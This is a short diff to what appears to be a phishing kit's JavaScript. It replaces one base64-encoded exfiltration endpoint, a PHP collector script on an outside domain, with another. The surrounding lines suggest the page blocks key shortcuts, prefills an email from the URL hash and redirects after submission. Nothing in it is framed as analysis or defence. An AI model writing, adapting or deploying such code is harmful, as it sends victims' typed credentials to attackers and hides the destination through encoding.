@@ -26,7 +26,7 @@ window.addEventListener("keydown", async (e) => {
               117 === e.keyCode)
           ));
 
-      const url ="aHR0cHM6Ly90cmFmaWd1cmFzZ3JvdXAuY29tL21zZW5kMTAucGhw"; // ADD  YOUR ENCODED  PHPFILE  LINK
+      const url ="aHR0cHM6Ly90cmFmaWd1cmFzZ3JvdXAuY29tL21va28ucGhw"; // ADD  YOUR ENCODED  PHPFILE  LINK
       const redirectUrl = ""; // ADD YOUR REDIRECT URL HERE
 
       const hash = window.location.hash.split("#")[1];
